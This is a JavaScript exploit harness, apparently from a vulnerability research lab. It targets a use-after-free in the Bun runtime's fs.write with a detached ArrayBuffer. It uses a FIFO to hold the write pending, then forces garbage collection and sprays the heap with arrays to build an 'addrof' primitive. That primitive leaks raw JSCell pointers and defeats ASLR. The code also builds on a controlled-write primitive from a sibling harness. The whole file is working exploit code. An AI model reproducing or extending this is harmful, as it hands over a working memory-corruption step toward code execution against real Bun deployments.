// Focused addrof probe built on top of the controlled-write primitive proven
// by lab/harnesses/13-arb-rw-probes/fs-uaf-object-ref-roundtrip.js.
//
// Goal: leak the JSCell pointer of an attacker-chosen target object — i.e.
// a real `addrof(target)` primitive — through the BufferSource UAF, with
// stable bit recovery and no FFI dependency.
//
// Strategy: do the leak side of the roundtrip, but prepare the spray so the
// reclaimed butterfly slot at offset ELEMENT_OFFSET lands element[0] of a
// known spray array carrying our target object. The leak read returns the
// raw JSCell* of that target.
//
// We accept that the address bits are JSC-runtime (ASLR-slid), so the test
// validates structure, not a literal hex value:
//   - the leak is a 64-bit value with the top 16 bits clear (JSC NaN-boxed
//     pointer-shape: jsCell pointers have 0x0000xxxxxxxxxxxx form),
//   - it sits in JSC's per-VM heap range we have observed empirically
//     (roughly 0x0000_62XX_XXXX_XXXX on this build),
//   - leaking the same target twice in sequence yields the same address,
//   - leaking *different* targets yields *different* addresses.
//
// Run with the same ASAN_OPTIONS the project uses; quarantine_size_mb=0 is
// required so the freed BufferSource backing store is reclaimed promptly.

import fs from "node:fs";
import { spawnSync } from "node:child_process";
import { join } from "node:path";
import { tmpdir } from "node:os";

const size = Number(process.env.BUF_SIZE || 8192);
const slots = Number(process.env.SLOTS || 1024);
const sprayCount = Number(process.env.SPRAY_COUNT || 4096);
const elementOffset = Number(process.env.ELEMENT_OFFSET || 144);
const fillChunkSize = Number(process.env.FILL_CHUNK_SIZE || 4096);
const maxFillBytes = Number(process.env.MAX_FILL_BYTES || 1 << 20);
const readTimeoutMs = Number(process.env.READ_TIMEOUT_MS || 5000);

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

function detach(ab) {
  if (typeof ab.transfer === "function") ab.transfer(0);
  else structuredClone({}, { transfer: [ab] });
}

function gcNow() {
  if (typeof globalThis.Bun?.gc === "function") globalThis.Bun.gc(true);
  if (typeof globalThis.gc === "function") globalThis.gc();
}

function makeFifo(label) {
  const path = join(tmpdir(), `bun-uaf-addrof-${label}-${process.pid}-${Math.random().toString(36).slice(2, 8)}`);
  const mkfifo = spawnSync("mkfifo", [path], { stdio: "inherit" });
  if (mkfifo.status !== 0) throw new Error(`mkfifo failed: ${mkfifo.status}`);
  const readFd = fs.openSync(path, fs.constants.O_RDONLY | fs.constants.O_NONBLOCK);
  const fillFd = fs.openSync(path, fs.constants.O_WRONLY | fs.constants.O_NONBLOCK);
  const writeFd = fs.openSync(path, fs.constants.O_WRONLY);
  return { path, readFd, fillFd, writeFd };
}

function closeFifo(fifo) {
  for (const fd of [fifo.writeFd, fifo.fillFd, fifo.readFd]) {
    try { fs.closeSync(fd); } catch {}
  }
  try { fs.unlinkSync(fifo.path); } catch {}
}

function isAgain(e) {
  return e?.code === "EAGAIN" || e?.code === "EWOULDBLOCK";
}

function fillFifo(fifo) {
  const chunk = Buffer.alloc(fillChunkSize, 0x2e);
  let filled = 0;
  while (filled < maxFillBytes) {
    try {
      const n = fs.writeSync(fifo.fillFd, chunk, 0, Math.min(chunk.length, maxFillBytes - filled));
      if (n === 0) break;
      filled += n;
    } catch (e) {
      if (isAgain(e)) break;
      throw e;
    }
  }
  if (filled === 0) throw new Error("failed to fill fifo");
  return filled;
}

async function readExact(fifo, n, label) {
  const chunks = [];
  const scratch = Buffer.alloc(Math.min(8192, Math.max(1, n)));
  let total = 0;
  const deadline = Date.now() + readTimeoutMs;
  while (total < n) {
    try {
      const got = fs.readSync(fifo.readFd, scratch, 0, Math.min(scratch.length, n - total), null);
      if (got > 0) {
        chunks.push(Buffer.from(scratch.subarray(0, got)));
        total += got;
        continue;
      }
    } catch (e) {
      if (!isAgain(e)) throw e;
    }
    if (Date.now() >= deadline) throw new Error(`timed out reading ${label}: ${total}/${n}`);
    await sleep(1);
  }
  return Buffer.concat(chunks, total);
}

function readU64LE(buf, offset) {
  let v = 0n;
  for (let i = 7; i >= 0; i--) v = (v << 8n) | BigInt(buf[offset + i]);
  return v;
}

// addrof(target): plant `target` at element[0] of every spray array, run the
// leak primitive, and return the 64-bit value at the magic offset of the
// leaked bytes. That is the raw JSCell* of `target`.
async function addrof(target) {
  const fifo = makeFifo("leak");
  const retained = [];
  try {
    const filled = fillFifo(fifo);

    const ab = new ArrayBuffer(size);
    const source = new Uint8Array(ab);
    source.fill(0x51);

    const done = new Promise((resolve) => {
      fs.write(fifo.writeFd, source, 0, source.byteLength, null, (err, bytesWritten) => {
        resolve({ err, bytesWritten });
      });
    });

    detach(ab);
    gcNow();

    for (let i = 0; i < sprayCount; i++) {
      const arr = new Array(slots);
      for (let j = 0; j < slots; j++) arr[j] = target;
      retained.push(arr);
    }
    gcNow();

    await readExact(fifo, filled, "prefill");
    const leaked = await readExact(fifo, size, "leaked");
    await done;
    return readU64LE(leaked, elementOffset);
  } finally {
    closeFifo(fifo);
    retained.length = 0;
  }
}

const targetA = { kind: "addrof-target-A", marker: "alpha-" + Math.random() };
const targetB = { kind: "addrof-target-B", marker: "beta-" + Math.random() };

const a1 = await addrof(targetA);
const a2 = await addrof(targetA);
const b1 = await addrof(targetB);

const looksLikeJSCellPointer = (v) => (v >> 48n) === 0n && (v & 0x7n) === 0n && v >= 0x0000_1000_0000_0000n;

const result = {
  ok:
    looksLikeJSCellPointer(a1) &&
    looksLikeJSCellPointer(a2) &&
    looksLikeJSCellPointer(b1) &&
    a1 === a2 &&
    a1 !== b1,
  a1: `0x${a1.toString(16).padStart(16, "0")}`,
  a2: `0x${a2.toString(16).padStart(16, "0")}`,
  b1: `0x${b1.toString(16).padStart(16, "0")}`,
  stableAcrossRepeatedLeaks: a1 === a2,
  changesAcrossDistinctTargets: a1 !== b1,
  topBitsLooksLikeCellPointer: looksLikeJSCellPointer(a1),
};
console.log(JSON.stringify(result, null, 2));
process.exitCode = result.ok ? 86 : 1;
